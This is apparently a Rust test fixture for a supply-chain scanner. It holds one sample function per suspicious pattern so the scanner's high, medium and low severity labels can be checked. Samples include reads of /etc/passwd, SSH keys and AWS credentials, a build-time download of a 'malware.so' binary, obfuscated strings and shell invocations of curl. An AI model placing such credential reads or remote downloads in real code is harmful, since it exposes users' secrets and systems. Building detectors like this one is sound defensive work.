// Test file for verifying severity classification of all pattern types
// This file contains examples of each pattern type to verify correct severity assignment

// HIGH SEVERITY PATTERNS

// 1. Sensitive Path Access (HIGH)
fn sensitive_path_access() {
    let _ = std::fs::read("/etc/passwd");
    let _ = std::fs::read_to_string("~/.ssh/id_rsa");
    let _ = std::fs::read("~/.aws/credentials");
}

// 2. Build-time Download (HIGH)
fn build_download() {
    let client = reqwest::blocking::get("https://example.com/download/malware.so").unwrap();
    let _ = std::fs::write("downloaded.so", client.bytes().unwrap());
}

// 3. Obfuscation (HIGH)
fn obfuscation() {
    let encoded = base64::decode("SGVsbG8gV29ybGQ=").unwrap();
    let hex = hex::decode("48656c6c6f").unwrap();
    let mystery = "\x48\x65\x6c\x6c\x6f";
}

// MEDIUM SEVERITY PATTERNS

// 4. Network Calls (MEDIUM)
fn network_calls() {
    let _ = reqwest::get("https://example.com");
    let stream = std::net::TcpStream::connect("127.0.0.1:8080");
    let _ = hyper::Client::new();
}

// 5. Shell Commands (MEDIUM)
fn shell_commands() {
    std::process::Command::new("sh").arg("-c").arg("echo hello").status();
    std::process::Command::new("bash").arg("-c").arg("curl example.com").status();
}

// 6. Process Spawning (MEDIUM)
fn process_spawn() {
    let mut child = std::process::Command::new("ls").spawn().unwrap();
    child.wait();
}

// 7. File Access outside expected paths (MEDIUM)
fn file_access() {
    let _ = std::fs::read("/tmp/some_file");
    let _ = std::fs::write("/var/log/output", "data");
    std::fs::remove_file("/some/path");
}

// 8. Dynamic Library Loading (MEDIUM)
fn dynamic_lib() {
    let lib = libloading::Library::new("mylib.so").unwrap();
    let _ = dlopen::raw::Library::open("native.dll");
}

// 9. Compiler Flag Manipulation (MEDIUM)
fn compiler_flags() {
    println!("cargo:rustc-link-lib=evil");
    println!("cargo:rustc-link-search=/suspicious/path");
    println!("cargo:rustc-cfg=feature=\"hidden\"");
}

// 10. Macro Code Generation (MEDIUM)
fn macro_codegen() {
    let out_dir = std::env::var("OUT_DIR").unwrap();
    let dest_path = std::path::Path::new(&out_dir).join("generated.rs");
    std::fs::write(&dest_path, "pub fn generated() {}").unwrap();
}

// LOW SEVERITY PATTERNS

// 11. Environment Variable Access (LOW)
fn env_access() {
    let _ = std::env::var("PATH");
    let _ = std::env::var("HOME");
    std::env::set_var("MY_VAR", "value");
}

// 12. Unsafe Blocks (LOW)
fn unsafe_blocks() {
    unsafe {
        let ptr = std::ptr::null::<i32>();
        let _ = *ptr;
    }
}

fn main() {
    // This is a test file for severity classification verification
}
